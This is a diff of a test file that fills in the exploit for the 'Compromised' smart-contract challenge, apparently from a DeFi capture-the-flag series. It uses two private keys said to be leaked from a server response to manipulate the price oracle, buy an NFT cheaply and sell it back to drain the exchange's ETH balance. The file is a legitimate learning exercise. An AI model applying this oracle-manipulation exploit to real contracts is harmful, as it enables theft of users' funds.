@@ -51,8 +51,37 @@ describe('Compromised challenge', function () {
         expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
     });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+    // If we take the server response in bytes, convert it to a base64 string, then convert that string to hex, we get 2 private keys
+
+    it("Execution", async function () {
+      const privKey1 =
+        "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+
+      const privKey2 =
+        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+      const oracleAccount1 = new ethers.Wallet(privKey1).connect(ethers.provider);
+      const oracleAccount2 = new ethers.Wallet(privKey2).connect(ethers.provider);
+
+      const updatePrice = async (price) => {
+        await oracle.connect(oracleAccount1).postPrice("DVNFT", price);
+        await oracle.connect(oracleAccount2).postPrice("DVNFT", price);
+      };
+
+      // Update oracle price to our low price and purchase an NFT
+      const lowPrice = parseEther("0.001");
+      await updatePrice(lowPrice);
+      await exchange.connect(player).buyOne({ value: lowPrice });
+
+      // Reset the price to be the amount we sent in + it's balance, so we drain the entire balance
+      await updatePrice(lowPrice.add(EXCHANGE_INITIAL_ETH_BALANCE));
+
+      // Approve and sell
+      await nftToken.connect(player).approve(exchange.address, 0);
+      await exchange.connect(player).sellOne(0);
+
+      // Reset price
+      await updatePrice(INITIAL_NFT_PRICE);
     });
 
     after(async function () {
